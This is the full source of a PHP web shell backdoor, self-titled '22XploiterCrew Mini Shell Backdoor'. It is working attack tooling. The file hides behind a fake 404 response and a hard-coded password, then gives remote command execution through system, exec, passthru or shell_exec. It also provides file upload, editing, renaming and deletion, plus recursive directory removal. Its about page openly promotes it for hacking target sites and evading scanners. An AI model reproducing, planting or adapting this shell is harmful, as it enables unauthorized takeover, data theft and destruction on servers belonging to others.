<?php /**
 * 22XploiterCrew Mini Shell Backdoor
 * 
 * @author RandsX
 * @team 22XploiterCrew
 */
$Password="RandsX";

session_start();http_response_code(404);function _0($_8=null){?>
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="author" content="RandsX"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"><link rel="icon" type="image/png" href="https://avatars3.githubusercontent.com/u/53482167?s=460&v=4"><title>22XploiterCrew Shell Backdoor</title><style type="text/css" media="all">body{background-color:#000}::placeholder{color:#fff!important}</style></head><body><?php if($_8!==null):?><script type="text/javascript">alert("<?= $_8 ?>");</script><?php endif;?><div class="container mt-4"><h2 class="text-light text-center">22XploiterCrew</h2><img src="https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png" class="mx-auto d-block" width="300" height="200"><form method="post" class="mt-3"><div class="input-group mb-3"><input class="form-control bg-transparent text-light border-bottom rounded-0" style="border:0;box-shadow:none" placeholder="Password" name="password_form" required><div class="input-group-append"><button class="btn border-bottom text-light" type="submit" name="login" style="border:0;box-shadow:none">>></button></div></div></form></div></body></html>
<?php exit;}if(!isset($_SESSION[base64_encode($_SERVER["HTTP_HOST"])])){if((isset($_POST["login"]))){if($_POST["password_form"]==$Password){$_SESSION[base64_encode($_SERVER["HTTP_HOST"])]=true;}else{_0("Password is invalid");}}else{_0();}}function _1($_9){$_a=fileperms($_9);if(($_a&0xC000)==0xC000){$_b='s';}elseif(($_a&0xA000)==0xA000){$_b='l';}elseif(($_a&0x8000)==0x8000){$_b='-';}elseif(($_a&0x6000)==0x6000){$_b='b';}elseif(($_a&0x4000)==0x4000){$_b='d';}elseif(($_a&0x2000)==0x2000){$_b='c';}elseif(($_a&0x1000)==0x1000){$_b='p';}else{$_b='u';}$_b.=(($_a&0x0100)?'r':'-');$_b.=(($_a&0x0080)?'w':'-');$_b.=(($_a&0x0040)?(($_a&0x0800)?'s':'x'):(($_a&0x0800)?'S':'-'));$_b.=(($_a&0x0020)?'r':'-');$_b.=(($_a&0x0010)?'w':'-');$_b.=(($_a&0x0008)?(($_a&0x0400)?'s':'x'):(($_a&0x0400)?'S':'-'));$_b.=(($_a&0x0004)?'r':'-');$_b.=(($_a&0x0002)?'w':'-');$_b.=(($_a&0x0001)?(($_a&0x0200)?'t':'x'):(($_a&0x0200)?'T':'-'));return $_b;}function _2($_c=null,$_d="str"){if(isset($_GET["path"])){$_e=$_GET["path"];}else{$_e=getcwd();}$_e=str_replace("\\","/",$_e);$_f=explode("/",$_e);if($_d=="str"){return $_e.$_c;}elseif($_d=="arr"){return $_f;}}function _3($_10){echo "<script>document.location.href = '".$_10."'</script>";}function _4($_11){if(function_exists('system')){@ob_start();@system($_11);$_12=@ob_get_contents();@ob_end_clean();return $_12;}elseif(function_exists('exec')){@exec($_11,$_13);$_12="";foreach($_13 as $_b){$_12.=$_b;}return $_12;}elseif(function_exists('passthru')){@ob_start();@passthru($_11);$_12=@ob_get_contents();@ob_end_clean();return $_12;}elseif(function_exists('shell_exec')){$_12=@shell_exec($_11);return $_12;}}function _5(){$_9=explode('/',$_GET["file"]);return $_9;};$_14=function(){?>
<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=0.8,shrink-to-fit=no">
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css integrity=sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2 crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css>
<link rel=stylesheet href=https://rawcdn.githack.com/RandsX/Highlight-JavaScript/0a08485660a5ce6a99fda735c57b4a7cdf281171/styles/monokai-sublime.css>
<link rel=stylesheet href=https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/css/TextareaLine.min.css>
<title>22XploiterCrew Mini Shell Backdoor</title>
<style media=all>body{background-color:#000;color:#fff}nav.navbar{position:fixed;width:100%;z-index:999}.body{position:absolute;width:100%;top:60px}.table>tbody>tr>*{color:#fff;vertical-align:middle}::placeholder{color:#fff!important}#editor{background-color:#fff;border:1px solid #000;position:relative;height:300px}a{color:#fff}.custom-file-input:lang(en)~.custom-file-label::after{content:""}.custom-file-label::after{height:0;padding:0}</style>
<script src=https://rawcdn.githack.com/RandsX/Highlight-JavaScript/0a08485660a5ce6a99fda735c57b4a7cdf281171/highlight.pack.js></script>
<script src=https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/js/TextareaLine.min.js></script>
<script src=https://unpkg.com/sweetalert/dist/sweetalert.min.js></script>
<script>hljs.initHighlightingOnLoad()</script>
</head>
<body onload='TextareaLine.appendLineNumber("Editor")'>
<nav class="navbar border-bottom bg-dark">
<a href="" class="navbar-brand text-light">22XploiterCrew</a>
<button class="navbar-toggler text-light" data-toggle=collapse type=button data-target=#menu><i class="fa fa-wrench"></i></button>
<div class="collapse navbar-collapse" id=menu>
<div class="table-responsive-lg text-center mt-2">
<a href=? class="badge my-2 p-2 badge-secondary"><i class="fa fa-home"></i> Home</a>
<a href=?about class="badge my-2 p-2 badge-primary"><i class="fa fa-info-circle"></i> About</a>
<a href=?keluar class="badge my-2 p-2 badge-danger"><i class="fa fa-sign-out"></i> Keluar</a>
</div>
</div>
</nav>
<div class="px-3 py-2 body">
<?php if(!isset($_GET["about"])):?>
<div class="text-light border px-2 table-responsive-lg mb-3">
<div>
<ul style=list-style:none;margin:0;padding:0>
<li>
Uname : <?=php_uname()?>
</li>
</ul>
<nav aria-label=breadcrumb class="table-responsive-lg m-0 p-0">
<ol class="breadcrumb bg-transparent mb-0 p-0">
<span class="text-light mr-3">Path : </span>
<?php foreach(_2(null,"arr")as $_15=>$_16){if($_16==""&&$_15==0){echo "<a href=\"?path=/\" class=\"mr-2 text-light\">/</a>";continue;}if($_16=="")continue;echo "<li class=\"breadcrumb-item\"><a class=\"text-light\" href=\"?path=";for($_17=0;$_17<=$_15;$_17++){echo _2(null,"arr")[$_17];if($_17!=$_15)echo "/";}echo "\">".$_16."</a>";}?>
</ol>
</nav>
</div>
<hr class=border>
<div class=row>
<div class=col-md-6>
<form method=post>
<div class="input-group mb-3">
<input class="form-control bg-transparent text-light border-bottom rounded-0" style=border:0;box-shadow:none;padding:0 placeholder=Command name=command required>
<div class=input-group-append>
<button class="btn border-bottom text-light" type=submit name=cmd style=border:0;box-shadow:none>>></button>
</div>
</div>
</form>
</div>
<div class=col-md-6>
<form method=post enctype=multipart/form-data>
<div class="input-group mb-3">
<div class=custom-file>
<input type=hidden name=tool value=upload>
<input type=file class=custom-file-input name=file id=files>
<label class="custom-file-label bg-transparent text-light rounded-0" for=files>Choose file</label>
</div>
<div class=input-group-append>
<button class="btn border rounded-0 text-light" type=submit style=box-shadow:none>Upload</button>
</div>
</div>
</form>
</div>
</div>
</div>
<?php if(isset($_POST["cmd"])):?>
<span class=text-light>Command : <?= $_POST["command"]?></span>
<pre><code class=bash><?= _4($_POST["command"])?></code></pre>
<?php endif;?>
<?php if(isset($_FILES["file"])){if(@copy($_FILES['file']['tmp_name'],_2("/".$_FILES['file']['name']))){echo "<script>
 swal({
 title: \"Success\",
 text: \"File upload successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((upload) => {
 if (upload) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}else{echo "<script>
 swal({
 title: \"Error\",
 text: \"File failed to upload!\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((upload) => {
 if (upload) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}?>
<?php if(isset($_GET["keluar"])){session_destroy();_3("?");}?>
<?php if($_GET["type"]=="file"&&$_GET["action"]=="view"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href=# class=text-warning>View</a> ] [ <a href="<?= "?path="._2()."&action=edit&type=file&file=".$_GET["file"]?>">Edit</a> ] [ <a href="<?= "?path="._2()."&action=rename&type=file&file=".$_GET["file"]?>">Rename</a> ] [ <a href="<?= "?path="._2()."&action=delete&type=file&file=".$_GET["file"]?>">Delete</a> ]
</div>
<span>File : <?= end(_5());?></span>
<pre><code class="<?= $_GET["ext"]?>"><?= htmlspecialchars(file_get_contents($_GET["file"]))?></code></pre>
<?php endif;?>
<?php if($_GET["type"]=="file"&&$_GET["action"]=="edit"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href="<?= "?path="._2()."&action=view&type=file&file=".$_GET["file"]?>">View</a> ] [ <a href=# class=text-warning>Edit</a> ] [ <a href="<?= "?path="._2()."&action=rename&type=file&file=".$_GET["file"]?>">Rename</a> ] [ <a href="<?= "?path="._2()."&action=delete&type=file&file=".$_GET["file"]?>">Delete</a> ]
</div>
<div class=text-center>
<input oninput='editor.style.height=this.value+"px"' type=range value=500 min=100 max=1500 class=custom-range>
</div>
<span>File : <?= end(_5());?></span>
<form method=post>
<div id=editor>
<textarea name=source id=Editor rows=3><?= htmlspecialchars(file_get_contents($_GET["file"]))?></textarea>
</div>
<div class="form-group mt-3">
<button type=submit class="btn btn-primary" name=edit_file>Save</button>
</div>
</form>
<hr class=border>
<?php if(isset($_POST["edit_file"])){$_18=$_POST["source"];$_19=fopen($_GET["file"],"w");$_1a=fwrite($_19,htmlspecialchars_decode($_18));if($_1a){echo "<script>
 swal({
 title: \"Success\",
 text: \"File edited successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}endif;?>
<?php if($_GET["type"]=="file"&&$_GET["action"]=="delete"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href="<?= "?path="._2()."&action=view&type=file&file=".$_GET["file"]?>">View</a> ] [ <a href="<?= "?path="._2()."&action=edit&type=file&file=".$_GET["file"]?>">Edit</a> ] [ <a href="<?= "?path="._2()."&action=rename&type=file&file=".$_GET["file"]?>">Rename</a> ] [ <a href=# class=text-warning>Delete</a> ]
</div>
<div class=text-center>File : <?= end(_5());?></div>
<h4 class=text-center>Are you sure delete this file?</h4>
<form class=mt-3 method=post>
<div class=row>
<div class=col-md-6>
<div class=form-group>
<button type=submit class="btn btn-primary btn-block" name=yes>Yes</button>
</div>
</div>
<div class=col-md-6>
<div class=form-group>
<a href="<?= "?path="._2()?>" class="btn btn-danger btn-block">Cancel</a>
</div>
</div>
</div>
</form>
<hr class=border>
<?php if(isset($_POST["yes"])){if(unlink($_GET["file"])){echo "<script>
 swal({
 title: \"Success\",
 text: \"File deleted successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((deleted) => {
 if (deleted) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}else{echo "<script>
 swal({
 title: \"Error\",
 text: \"File failed to delete\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((deleted) => {
 if (deleted) {
 document.location.href = \"?path="._2()."&action=delete&type=file&file=".$_GET['file']."\"
 }
 });
 </script>";}}endif;?>
<?php if($_GET["type"]=="file"&&$_GET["action"]=="rename"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href="<?= "?path="._2()."&action=view&type=file&file=".$_GET["file"]?>">View</a> ] [ <a href="<?= "?path="._2()."&action=edit&type=file&file=".$_GET["file"]?>">Edit</a> ] [ <a href=# class=text-warning>Rename</a> ] [ <a href="<?= "?path="._2()."&action=delete&type=file&file=".$_GET["file"]?>">Delete</a> ]
</div>
<span>File : <?= end(_5());?></span>
<form method=post>
<div class=form-group>
<input name=file_name class="form-control bg-transparent text-light" value="<?= htmlspecialchars($_GET["file"])?>">
</div>
<div class=form-group>
<button type=submit class="btn btn-primary" name=rename_file>Save</button>
</div>
</form>
<?php if(isset($_POST["rename_file"])){$_1b=$_POST["file_name"];if(!file_exists($_1b)){if(rename($_GET["file"],$_1b)){echo "<script>
 swal({
 title: \"Success\",
 text: \"File name changed successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}else{echo "<script>
 swal({
 title: \"Error\",
 text: \"The filename failed to change!\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."&action=rename&type=file&file=".$_GET['file']."\"
 }
 });
 </script>";}}else{echo "<script>
 swal({
 title: \"Warning!\",
 text: \"The file name has been used!\",
 icon: \"warning\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."&action=rename&type=file&file=".$_GET['file']."\"
 }
 });
 </script>";}}endif;?>

<?php if($_GET["type"]=="dir"&&$_GET["action"]=="delete"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href="<?= "?path="._2()."&action=rename&type=dir&dir=".$_GET["dir"]?>">Rename</a> ] [ <a href=# class=text-warning>Delete</a> ]
</div>
<div class="table-responsive-lg text-center">
<h4>Are you sure delete this Directory <u><?= $_GET["dir"]?></u> ?</h4>
</div>
<form class=mt-3 method=post>
<div class=row>
<div class=col-md-6>
<div class=form-group>
<button type=submit class="btn btn-primary btn-block" name=yes>Yes</button>
</div>
</div>
<div class=col-md-6>
<div class=form-group>
<a href="<?= "?path="._2()?>" class="btn btn-danger btn-block">Cancel</a>
</div>
</div>
</div>
</form>
<hr class=border>
<?php if(isset($_POST["yes"])){if(is_dir($_GET["dir"])){if(is_writable($_GET["dir"])){@rmdir($_GET["dir"]);@_4("rm -rf ".$_GET["dir"]);@_4("rmdir /s /q ".$_GET["dir"]);echo "<script>
 swal({
 title: \"Success\",
 text: \"Directory deleted successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((deleted) => {
 if (deleted) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}else{echo "<script>
 swal({
 title: \"Warning!\",
 text: \"This is not a Directory\",
 icon: \"warning\",
 button: \"Back\",
 })
 .then((deleted) => {
 if (deleted) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}endif;?>
<?php if($_GET["type"]=="dir"&&$_GET["action"]=="rename"):?>
<hr class=border>
<div class="text-center mb-2">
[ <a href=# class=text-warning>Rename</a> ] [ <a href="<?= "?path="._2()."&action=delete&type=dir&dir=".$_GET["dir"]?>">Delete</a> ]
</div>
<span>Name : </span>
<form method=post>
<div class=form-group>
<input name=dir_name class="form-control bg-transparent text-light" value="<?= htmlspecialchars($_GET["dir"])?>">
</div>
<div class=form-group>
<button type=submit class="btn btn-primary" name=rename_dir>Save</button>
</div>
</form>
<?php if(isset($_POST["rename_dir"])){$_1c=$_POST["dir_name"];if(!file_exists($_1c)){if(rename($_GET["dir"],$_1c)){echo "<script>
 swal({
 title: \"Success\",
 text: \"Directory name changed successfully!\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}else{echo "<script>
 swal({
 title: \"Error\",
 text: \"The directory name failed to change!\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."&action=rename&type=dir&dir=".$_GET['dir']."\"
 }
 });
 </script>";}}else{echo "<script>
 swal({
 title: \"Warning!\",
 text: \"The directory name has been used!\",
 icon: \"warning\",
 button: \"Back\",
 })
 .then((edited) => {
 if (edited) {
 document.location.href = \"?path="._2()."&action=rename&type=dir&dir=".$_GET['dir']."\"
 }
 });
 </script>";}}endif;?>
<?php if(is_writable(_2())||is_readable(_2())):$_1d=scandir(_2())?>
<div class="table-responsive-lg mt-3">
<table class="table table-sm table-hover table-bordered">
<thead class="text-center bg-warning">
<tr>
<th>Name</th>
<th>Type</th>
<th>Size</th>
<th>Permission</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php foreach(array_diff($_1d,array(".",".."))as $_1e):if(!is_dir(_2("/$_1e")))continue;$_1f=filesize(_2("/$_1e"))/1024;$_1f=round($_1f,3);if($_1f>=1024){$_1f=round($_1f/1024,2).' MB';}else{$_1f=$_1f.' KB';}?>
<tr>
<td><img src=http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png width=18 class=mr-2><a href="?path=<?= _2("/$_1e")?>" class=text-light><?= $_1e ?></a></td>
<td class=text-center>Directory</td>
<td class=text-center><?= $_1f ?></td>
<td class=text-center>
<?php if(is_writable(_2("/$_1e")))echo "<font color=\"#00ff00\">";if(!is_readable(_2("/$_1e")))echo "<font color=\"red\">";echo _1(_2("/$_1e"));;if(is_writable(_2("/$_1e")||!is_readable(_2("/$_1e"))))echo "</font>";?>
</td>
<td class=text-center>
<a href="<?= "?path="._2()."&action=rename&type=dir&dir="._2("/$_1e")?>" data-toggle=tooltip data-placement=auto title=Rename class="badge mx-1"><i class="fa fa-pencil"></i></a>
<a href="<?= "?path="._2()."&action=delete&type=dir&dir="._2("/$_1e")?>" data-toggle=tooltip data-placement=auto title=Delete class="badge mx-1"><i class="fa fa-trash"></i>
</a>
</td>
</tr>
<?php endforeach;foreach($_1d as $_9):if(!is_file(_2("/$_9")))continue;$_1f=filesize(_2("/$_9"))/1024;$_1f=round($_1f,3);if($_1f>=1024){$_1f=round($_1f/1024,2).' MB';}else{$_1f=$_1f.' KB';}?>
<tr>
<td>
<?php $_20=strtolower(pathinfo($_9,PATHINFO_EXTENSION));echo "<img width=\"18\" src=\"";if($_20=="php"){echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';}elseif($_20=="html"){echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';}elseif($_20=="css"){echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';}elseif($_20=="png"){echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';}elseif($_20=="jpg"){echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';}elseif($_20=="jpeg"){echo 'http://i.imgur.com/e8mkvPf.png"';}elseif($_20=="zip"){echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';}elseif($_20=="js"){echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';}elseif($_20=="ttf"){echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';}elseif($_20=="otf"){echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';}elseif($_20=="txt"){echo 'https://image.flaticon.com/icons/png/128/136/136538.png';}elseif($_20=="ico"){echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';}elseif($_20=="conf"){echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';}elseif($_20=="htaccess"){echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';}elseif($_20=="sql"){echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';}elseif($_20=="pdf"){echo 'https://image.flaticon.com/icons/png/128/136/136522.png';}elseif($_20=="md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';}else{echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';}echo "\">";?>
<a href="<?= "?path="._2()."&action=view&type=file&file="._2("/$_9")."&ext=$_20"?>" class=text-light><?= htmlspecialchars($_9)?></a>
</td>
<td class=text-center><?= filetype(_2("/$_9"))?></td>
<td class=text-center><?= $_1f ?></td>
<td class=text-center>
<?php if(is_writable(_2("/$_1e")))echo "<font color=\"#00ff00\">";if(!is_readable(_2("/$_1e")))echo "<font color=\"red\">";echo _1(_2("/$_1e"));;if(is_writable(_2("/$_1e")||!is_readable(_2("/$_1e"))))echo "</font>";?>
</td>
<td class=text-center>
<a href="<?= "?path="._2()."&action=rename&type=file&file="._2("/$_9")?>" class="badge mx-1" data-toggle=tooltip data-placement=auto title=Rename><i class="fa fa-pencil"></i></a>
<a href="<?= "?path="._2()."&action=edit&type=file&file="._2("/$_9")?>" class="badge mx-1" data-toggle=tooltip data-placement=auto title=Edit><i class="fa fa-edit"></i></a>
<a href="<?= "?path="._2()."&action=delete&type=file&file="._2("/$_9")?>" class="badge mx-1" data-toggle=tooltip data-placement=auto title=Delete><i class="fa fa-trash"></i></a>
</td>
</tr>
<?php endforeach;?>
</tbody>
</table>
</div>
<div class=row>
<div class=col-md-6>
<form method=post>
<div class="input-group mb-3">
<input class="form-control bg-transparent text-light border rounded-0" style=box-shadow:none placeholder="Folder Name" name=folder_name required>
<div class=input-group-append>
<button class="btn border rounded-0 text-light" type=submit name=make_folder style=border:0;box-shadow:none>Confirm</button>
</div>
</div>
</form>
</div>
<div class=col-md-6>
<form method=post>
<div class="input-group mb-3">
<input class="form-control bg-transparent text-light border rounded-0" style=box-shadow:none placeholder="File Name" name=file_name required>
<div class=input-group-append>
<button class="btn border rounded-0 text-light" type=submit name=make_file style=border:0;box-shadow:none>Confirm</button>
</div>
</div>
</form>
</div>
</div>
<?php if(isset($_POST["make_folder"])){$_21=$_POST['folder_name'];$_21=preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})",'',$_21);if(is_writable(_2())&&mkdir($_21)){echo "<script>
 swal({
 title: \"Success\",
 text: \"Directory ".$_21." successfully created\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((make_dir) => {
 if (make_dir) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}else{echo "
 <script>
 swal({
 title: \"Error\",
 text: \"Directory ".$_21." error created\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((make_dir) => {
 if (make_dir) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}if(isset($_POST["make_file"])){$_9=$_POST['file_name'];$_9=preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})",'',$_9);if(!file_exists(_2("/$_9"))){if(is_writable(_2())&&file_put_contents(_2("/$_9"),$_9)){echo "<script>
 swal({
 title: \"Success\",
 text: \"File ".$_9." successfully created\",
 icon: \"success\",
 button: \"Back\",
 })
 .then((make_file) => {
 if (make_file) {
 document.location.href = \"?path="._2()."&action=edit&type=file&file="._2("/$_9")."\"
 }
 });
 </script>";}else{echo "
 <script>
 swal({
 title: \"Error\",
 text: \"File ".$_9." error created\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((make_file) => {
 if (make_file) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}else{echo "
 <script>
 swal({
 title: \"Error\",
 text: \"The file name has been used\",
 icon: \"error\",
 button: \"Back\",
 })
 .then((make_file) => {
 if (make_file) {
 document.location.href = \"?path="._2()."\"
 }
 });
 </script>";}}?>
<?php else:?>
<div style=color:red>
Error, directory <b><u><?= _2()?></u></b> is not writable or readable.
</div>
<?php endif;else:?>
<div class="container mt-4">
<h2 class="text-light text-center">22XploiterCrew Mini Shell Backdoor v1.2</h2>
<img src=https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png class="mx-auto d-block" width=300 height=200>
<hr class=border>
<p>
This is a backdoor shell that is used for hacking purposes and anti-scanned by google or other hackers, this backdoor shell was created because of the many requests that came from our YouTube subscribers. This backdoor shell is equipped with several hacking tools that make it easy for you to hack the target site that has an embedded backdoor shell. <br> This backdoor shell made by CEO-LEADER 22XploiterCrew Mini and it is also open source for everyone, so you can re-edit this shell as you like and on the condition that you don't delete the author that has been set. Thank you for your participation. <br> Social Media : <br>
</p><ul>
<li>Instagram : _sndrx</li>
<li>Youtube : 22XploiterCrew</li>
<li>Site : <a href="" target=_blank style=text-decoration:underline>22XploiterCrew</a> and <a href="" target=_blank style=text-decoration:underline>Hackers Zone</a></li>
</ul>
<br> <center>&copy; 2020 22XploiterCrew Mini - CodeX By RandsX</center>
<p></p>
</div>
<?php endif;?>
</div>
<script src=https://code.jquery.com/jquery-3.5.1.slim.min.js integrity=sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js integrity=sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s crossorigin=anonymous></script>
<script>$('[data-toggle="tooltip"]').tooltip(),$("#files").change(function(){if(fullPath=$(this).val(),fullPath){var l=0<=fullPath.indexOf("\\")?fullPath.lastIndexOf("\\"):fullPath.lastIndexOf("/"),t=fullPath.substring(l);0!==t.indexOf("\\")&&0!==t.indexOf("/")||(t=t.substring(1)),$(".custom-file-label").html(t)}})</script>
</body>
</html>
<?php };$_14();